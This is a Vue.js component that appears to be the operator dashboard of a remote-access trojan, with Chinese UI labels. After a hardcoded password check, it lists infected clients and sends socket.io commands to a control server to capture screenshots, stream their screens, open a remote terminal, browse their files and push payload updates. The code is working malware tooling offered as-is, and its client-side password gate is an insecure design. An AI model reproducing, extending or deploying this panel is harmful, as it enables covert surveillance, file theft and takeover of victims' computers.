<template>
  <v-container>
    <v-container v-show="!$store.state.clients.verify.show">
      <v-container>
        <v-text-field
          name="name"
          label="输入密码"
          v-model="verify.password"
          type="password"
          @keydown.enter="verifyPassword"
        >
          <template v-slot:append
            ><v-btn outlined @click="verifyPassword">验证</v-btn></template
          >
        </v-text-field>
      </v-container>
    </v-container>
    <v-container v-if="$store.state.clients.verify.show" class="ma-0 pa-0">
      <p :style="status_style" class="ml-3">{{ server_status }}</p>
      <v-container>
        <v-btn-toggle multiple max="0">
          <v-btn @click="updateAllClients" outlined> 更新所有客户端 </v-btn>
        </v-btn-toggle>
        <v-alert
          transition="slide-x-transition"
          style="
            position: fixed;
            right: 0;
            z-index: 999;
            bottom: 10px;
            border: 1px white solid;
          "
          dismissible
          close-icon="fa-close"
          v-model="screenshot.show"
          ><v-img
            :src="screenshot.src"
            :aspect-ratio="screenshot.ratio"
            :width="screenshot.width"
            @click="
              screenshot.width == '70vw'
                ? (screenshot.width = '30vw')
                : (screenshot.width = '70vw')
            "
            ><template v-slot:placeholder>
              <v-row class="fill-height ma-0" align="center" justify="center">
                <v-progress-circular
                  indeterminate
                  color="grey lighten-5"
                ></v-progress-circular>
              </v-row> </template></v-img
        ></v-alert>
      </v-container>
      <v-container style="overflow: auto; height: 65vh">
        <v-item-group v-model="selectedIndex">
          <template v-for="i in clientArr">
            <v-item :key="i.id" v-slot="{ toggle }" class="mb-4">
              <v-card
                @click="toggle"
                :class="{ streaming: i.streaming }"
                v-ripple="false"
              >
                <v-card-title>{{ i.id }}</v-card-title>
                <v-card-subtitle>主机名: {{ i.主机名 }}</v-card-subtitle>
                <v-card-subtitle>平台: {{ i.系统版本名 }}</v-card-subtitle>
                <v-card-actions>
                  <v-menu offset-y
                    ><template v-slot:activator="{ on }">
                      <v-btn v-on="on">操作</v-btn></template
                    >
                    <v-btn-toggle dense style="overflow: auto">
                      <v-btn dense @click="showClientDetails(i.id)">
                        详细信息
                      </v-btn>
                      <v-btn dense @click="dialog(i.id)">分析</v-btn>
                      <v-btn dense @click="toControlPage(i.id)"> 终端 </v-btn>
                      <v-btn dense @click="getScreenshot(i.id)"> 截图 </v-btn>
                      <v-btn dense @click="toggleVideoCapture(i.id)">
                        推流:{{
                          $myUtils.getClientById(clientArr, i.id)["streaming"]
                            ? "开"
                            : "关"
                        }}
                      </v-btn>
                      <v-btn dense @click="showFileExplorer(i.id)">
                        文件浏览器
                      </v-btn>
                      <v-btn dense @click="updateThisClientCore(i.id)">
                        更新core
                      </v-btn>
                      <v-btn dense @click="updateThisClientUtils(i.id)">
                        更新utils
                      </v-btn>
                    </v-btn-toggle>
                  </v-menu>
                </v-card-actions>
                <v-divider></v-divider>
              </v-card>
            </v-item>
          </template>
        </v-item-group>

        <p v-show="!clientArr.length">列表为空</p>
      </v-container>
      <context-menu
        :contextMenu="$store.state.contextMenu"
        :msg="msg"
        :template="contextMenu.template"
      ></context-menu>
    </v-container>
  </v-container>
</template>

<script>
// const { ipcRenderer } = window.require("electron");
import sio from "socket.io-client";
import ss from "socket.io-stream";
import { SERVER_ADDRESS, SERVER_PORT } from "../../../my_config";
export default {
  name: "clients",
  data() {
    return {
      verify: {
        password: "",
        show: false,
      },
      clientArr: [],
      selectedId: "",
      selectedIndex: null,
      interval: null,
      touchTimeout: 0,
      // server_status: window.server_status,
      server_status: "未连接",
      newBackendName: "backend",
      screenshot: {
        show: false,
        enlarge: false,
        src: "",
        ratio: 16 / 9,
        width: "30vw",
      },
      contextMenu: {
        template: [
          {
            label: "显示此客户端详细信息",
            click: () => {
              for (let i = 0; i < window.clientArr.length; i++) {
                if (window.clientArr[i].id === this.msg.id) {
                  let str = "";
                  for (let item in window.clientArr[i]) {
                    str += `${item}: ${window.clientArr[i][item]}\n`;
                    // console.log(`${item}: ${window.clientArr[i][item]}`);
                  }
                  alert(str);
                  break;
                }
              }
              // alert(1);
            },
          },
          {
            label: "打开文件浏览器",
            click: () => {
              console.log(this.msg.id);
              this.$store.state.io.emit("apilistdir", this.msg.id, ".");
              this.$router.push({
                path: `/trojan/fileexplorer`,
                query: {
                  id: this.msg.id,
                },
              });
            },
          },
          {
            label: "获取此客户端屏幕截图",
            click: () => {
              this.$store.state.io.emit("apigetscreenshot", this.msg.id);
            },
          },
          {
            label: "开启此客户端屏幕推流",
            click: () => {
              this.$store.state.io.emit("apistartvideocapture", this.msg.id);
            },
          },
          // { type: "separator" },
          {
            label: "更新此客户端",
            click: () => {
              this.$store.state.io.emit(
                "apiupdatethisclient",
                this.msg.id,
                "backend"
              );
            },
          },
          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
        show: false,
        mousePos: {
          screenX: 0,
          screenY: 0,
          clientX: 0,
          clientY: 0,
        },
      },
      msg: {},
    };
  },
  computed: {
    ca() {
      return this.$store.getters.getClientArr;
    },
    screenshotStyle() {
      return this.screenshot.enlarge
        ? {
            position: "fixed",
            left: "0",
            top: "0",
            right: "0",
            bottom: "0",
            margin: "auto",
            // height: "90vh",
            width: "80vw",
            border: "1px black solid",
          }
        : // {
          //   width: "80vw",
          //   height: "auto",
          // }
          { width: "30vw", height: "auto" };
    },
    status_style() {
      let tmp = {};
      switch (this.server_status) {
        case "已连接": {
          tmp = { color: "green" };
          break;
        }
        case "未连接":
        case "已断开": {
          tmp = { color: "red" };
        }
      }
      return tmp;
    },
    checkSelected() {
      return (id) => {
        if (id == this.selectedId) return true;
        else return false;
      };
    },
    // getSelected() {
    //   return function (id) {
    //     for (const client of window.clientArr) {
    //     }
    //   };
    // },
    // checkStreaming() {
    //   return function (id) {};
    // },
  },
  watch: {
    selectedIndex: {
      handler(nv, ov) {
        if (nv == undefined) {
          this.selectedId = "";
          return;
        }
        this.selectedId = this.clientArr[nv].id;
      },
    },
    "window.screenshot": {
      handler(nv, ov) {
        this.screenshot.src = window.screenshot;
      },
    },
  },
  beforeMount() {
    document.documentElement.addEventListener("keydown", (e) => {
      if (e.key == "ArrowDown" && e.ctrlKey) {
        this.$store.state.clients.verify.show =
          !this.$store.state.clients.verify.show;
      }
      // if (e.key == "ArrowUp") {
      // }
    });
    document.documentElement.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });

    // window.clientArr = [];
    window.cmdResult = {
      data: "",
      changed: false,
    };

    window.cmdResult = new Proxy(window.cmdResult, {
      get(target, key) {
        return target[key];
      },
      set(target, key, value) {
        target[key] = value;
        //监听data改变
        if (key == "data") {
          window.cmdResult.changed = true;
        }
        return true;
      },
    });

    if (!this.$store.state.io) {
      this.$store.state.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
        // withCredentials: true,
      });
      this.$store.state.ss = ss;
      // window.server_status = "未连接";

      this.$store.state.io.on("connect", () => {
        this.$store.state.io.send({ admin: true });
        this.server_status = "已连接";
      });

      this.$store.state.io.on("disconnect", () => {
        this.server_status = "已断开";
      });

      this.$store.state.io.on("apigetallclients", (carr) => {
        this.clientArr = carr;
        this.server_status = "已连接";
      });

      this.$store.state.io.on("apisendcmd", (cmdresult) => {
        window.cmdResult.data = cmdresult.data;
        console.log(cmdresult);
      });

      this.$store.state.io.on("apigetscreenshot", (imgbase64) => {
        this.screenshot.src = `data:image/jpg;base64,${imgbase64}`;
        this.screenshot.show = true;
      });

      this.$store.state.io.on("apidialog", (dialogContent) => {
        this.$store.commit("setGlobalStatus", "dx分析完毕");
        console.log(dialogContent);
      });

      this.$store.state.io.on("debug", (msg) => {
        console.log(`--DEBUG:\n${msg}`);
      });
    }

    //先一秒后五秒获取服务器数据,以优化输入密码时造成的不流畅现象
    this.interval = setInterval(() => {
      //!!
      this.$store.state.io.emit("apigetallclients");

      // that.clientArr = window.clientArr;
      // that.server_status = window.server_status;
      window.clientArr = this.clientArr;
      this.$forceUpdate();
    }, 1000);

    let tmp = this.interval;
    setTimeout(() => {
      clearInterval(tmp);
      tmp = null;
      this.interval = setInterval(() => {
        //!!
        this.$store.state.io.emit("apigetallclients");

        // that.clientArr = window.clientArr;
        // that.server_status = window.server_status;
        // that.screenshot.src = window.screenshot;
        window.clientArr = this.clientArr;
        this.$forceUpdate();
      }, 5000);
    }, 2000);

    // ipcRenderer.on("showFileExplorer", (e, id) => {
    //   window.io.emit("apilistdir", id, ".");
    //   that.$router.push({
    //     path: `/trojan/fileexplorer`,
    //     query: {
    //       id: id,
    //     },
    //   });
    // });
    // ipcRenderer.on("startVideoCapture", (e, id) => {
    //   window.io.emit("apistartvideocapture", id);
    // });
  },
  methods: {
    verifyPassword() {
      if (this.verify.password == "52013140") {
        this.$store.state.clients.verify.show = true;
      } else {
        alert("Password wrong!");
      }
    },
    toControlPage(id) {
      // console.log("click", id);
      this.$router.push("/trojan/control/" + id);
    },
    showClientDetails(id) {
      for (let i = 0; i < this.clientArr.length; i++) {
        if (this.clientArr[i].id === id) {
          let str = "";
          for (let item in this.clientArr[i]) {
            str += `${item}: ${this.clientArr[i][item]}\n`;
            // console.log(`${item}: ${window.clientArr[i][item]}`);
          }
          alert(str);
          break;
        }
      }
    },
    getScreenshot(id) {
      this.screenshot.src = null;
      this.$store.state.io.emit("apigetscreenshot", id);
    },
    updateThisClient(id) {
      this.$store.state.io.emit("apiupdatethisclient", id, "serviceCore.zip");
    },
    updateThisClientCore(id) {
      this.$store.state.io.emit(
        "apiupdatethisclientcore",
        id,
        "serviceCore.zip"
      );
    },
    updateThisClientUtils(id) {
      this.$store.state.io.emit("apiupdatethisclientutils", id, "utils.zip");
    },
    showContextMenu(event, id) {
      // window.ipcRenderer.send("show-context-menu", {
      //   id: id,
      //   newBackendName: this.newBackendName,
      // });

      event = event || window.event;

      // this.$store.state.contextMenu.show = !this.$store.state.contextMenu.show;
      this.$store.state.contextMenu.show = true;
      this.$store.state.contextMenu.mousePos.screenX = event.screenX;
      this.$store.state.contextMenu.mousePos.screenY = event.screenY;
      this.$store.state.contextMenu.mousePos.clientX = event.clientX;
      this.$store.state.contextMenu.mousePos.clientY = event.clientY;
      this.msg.id = id;
      if (this.selectedId == id) {
        this.selectedId = "";
      } else {
        this.selectedId = id;
      }
    },
    longPressShowContextMenu(id) {
      this.touchTimeout = setTimeout(() => {
        this.touchTimeout = 0;
        this.showContextMenu(id);
      }, 1500);
    },
    updateAllClients() {
      this.$store.state.io.emit("apiupdateallclients", this.newBackendName);
    },
    scaleTrigger() {
      this.screenshot.enlarge = !this.screenshot.enlarge;
    },
    clearImg() {
      // this.screenshot.src = "";
      window.screenshot = "";
      this.screenshot.enlarge = false;
    },
    // clearSelectedId(event) {
    //   // event = event || window.event;
    //   // this.selectedId = "";
    //   // event.stopPropatation();
    //   // event.preventDefault();
    // },
    longPressClearImg() {
      this.touchTimeout = setTimeout(() => {
        this.clearImg();
      }, 700);
    },
    toggleVideoCapture(id) {
      const streaming = this.$myUtils.getClientById(this.clientArr, id)[
        "streaming"
      ];

      if (streaming) {
        this.$store.state.io.emit("apistopvideocapture", id);
      } else {
        this.$store.state.io.emit("apistartvideocapture", id);
      }
    },
    stopVideoCapture() {
      for (const item of this.clientArr) {
        if (item["streaming"] || item["id"] == this.selectedId) {
          this.$store.state.io.emit("apistopvideocapture", item["id"]);
        }
      }
    },
    startVideoCapture(id) {
      this.$store.state.io.emit("apistartvideocapture", id);
    },
    showFileExplorer(id) {
      this.$store.state.io.emit("apilistdir", id, ".");
      this.$router.push({
        path: `/trojan/fileexplorer`,
        query: {
          id: id,
        },
      });
    },
    dialog(selectedId) {
      this.$store.state.io.emit("apidialog", selectedId);
      this.$store.commit("setGlobalStatus", `正在dx分析中...`);
    },
  },
  // components: {
  //   "context-menu": ContextMenuVue,
  //   notification: NotificationVue,
  // },
};
</script>

<style lang="scss">
.scrennshotWrapper {
  position: relative;
  p {
    // border-radius: 100%;
    cursor: pointer;
    padding: 1px;
    color: white;
    background-color: rgba(155, 155, 155, 0.5);
    position: absolute;
    right: 5px;
    top: 5px;
    &:hover {
      background-color: rgb(104, 104, 104);
    }
  }
}
#screenshot {
  width: 50vw;
  // height: 30vh;
  transition: 0.3s;
  border: 1px solid black;
}
// #ClientGroup {
//   display: flex;
//   flex-direction: row;
//   overflow: auto;
//   height: 60vh;
//   // height: 400px;
//   // height: 80%;
//   padding-top: 10px;
//   width: 100vw;
//   box-sizing: border-box;
//   padding: 5px 2% 0 2%;
//   flex-wrap: wrap;
//   align-items: flex-start;
//   justify-content: space-between;

//   .client {
//     box-sizing: border-box;
//     padding: 2%;
//     border: 1px solid black;
//     display: flex;
//     flex-direction: column;
//     justify-content: left;
//     // margin: 0 1% 10px 1%;
//     margin-bottom: 2%;
//     text-align: left;
//     // width: 46vw;
//     width: 49%;

//     p {
//       user-select: none;
//     }

//     &:hover {
//       box-shadow: 0px 5px 10px gray;
//       cursor: pointer;
//       transition: 0.2s;
//     }
//   }
// }

.streaming {
  animation: streaming infinite alternate 1.5s;
}

.clientselected {
  background-color: rgb(209, 209, 209);
  border: 3px rgb(6, 90, 158) solid !important;
}

#client-selected-button-group {
  display: flex;
  flex-wrap: nowrap;
  button {
    cursor: pointer;
  }
}

.clientButton {
  margin: 0 3px;
}

@keyframes streaming {
  from {
  }
  to {
    background-color: rgb(47, 85, 47);
  }
}
</style>
